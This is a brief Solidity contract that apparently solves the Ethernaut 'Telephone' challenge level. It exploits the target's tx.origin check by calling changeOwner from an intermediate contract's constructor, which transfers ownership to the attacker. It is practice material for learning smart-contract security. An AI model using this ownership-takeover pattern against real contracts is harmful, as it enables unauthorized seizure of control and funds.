// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe

contract TelephoneHack {
    constructor(address _telephoneContractAddress) {
        ITelephone(_telephoneContractAddress).changeOwner(msg.sender);
    }
}

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address) external;
}
